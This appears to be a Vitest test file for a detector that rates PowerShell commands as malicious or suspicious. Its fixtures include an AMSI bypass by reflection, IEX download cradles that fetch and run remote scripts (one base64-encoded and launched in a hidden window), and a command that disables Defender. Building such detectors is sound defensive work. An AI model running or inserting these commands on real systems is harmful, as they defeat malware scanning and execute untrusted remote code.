import { describe, expect, it } from 'vitest'
import { analyze } from '../report'

describe('specificity-gated characterization', () => {
  it('emits a high-confidence characterization when a near-dispositive signal fires', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    expect(r.characterization).not.toBeNull()
    expect(r.characterization!.level).toBe('high-confidence-malicious')
    expect(r.characterization!.basis).toContain('amsi-reflection')
    // read is built ONLY from near-dispositive signals in basis.
    expect(r.characterization!.read).toMatch(/AMSI bypass via reflection/)
  })

  it('read contains only names present in basis (no strong/weak signal leaks in)', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true); Set-MpPreference -DisableRealtimeMonitoring $true")
    // Defender tamper is STRONG — its label must NOT appear in the read.
    expect(r.characterization!.read).not.toMatch(/Defender tampering/)
  })

  it('strong-only patterns yield NO characterization (anti-cry-wolf)', async () => {
    const r = await analyze("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
    expect(r.characterization).toBeNull()
  })

  it('benign-twin (download to file) yields no signals and no characterization', async () => {
    const r = await analyze("Invoke-WebRequest https://example.com/data.json -OutFile data.json")
    expect(r.characterization).toBeNull()
    expect(r.signals.find((s) => s.id === 'download-cradle')).toBeUndefined()
  })

  it('vssadmin resize shadowstorage alone (legitimate capacity-management admin work) yields no near-dispositive/high-confidence-malicious characterization (whole-branch review finding 3)', async () => {
    const r = await analyze('vssadmin resize shadowstorage /maxsize=500MB')
    expect(r.signals.find((s) => s.id === 'shadow-recovery-tamper')).toBeUndefined()
    expect(r.characterization).toBeNull()
  })
})

describe('suspicious tier (co-occurrence-corroborated, no intrinsic near-dispositive)', () => {
  const encCradle =
    'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
  it('a hidden-window -enc download cradle (evasion cluster + cradle) is SUSPICIOUS, not malicious', async () => {
    const r = await analyze('powershell -nop -w hidden -ep bypass -enc ' + encCradle)
    expect(r.characterization).not.toBeNull()
    expect(r.characterization!.level).toBe('suspicious')
    expect(r.characterization!.basis).toContain('download-cradle')
    expect(r.characterization!.read).toMatch(/[Ss]uspicious/)
    expect(r.characterization!.read).not.toMatch(/High-confidence malicious/)
  })
  it('a single strong signal with no corroboration yields NO characterization', async () => {
    const r = await analyze('Set-MpPreference -DisableRealtimeMonitoring $true')
    expect(r.characterization).toBeNull()
  })
  it('an intrinsic near-dispositive signal still yields high-confidence-malicious (unchanged)', async () => {
    const r = await analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed').SetValue($null,$true)")
    expect(r.characterization!.level).toBe('high-confidence-malicious')
  })
})
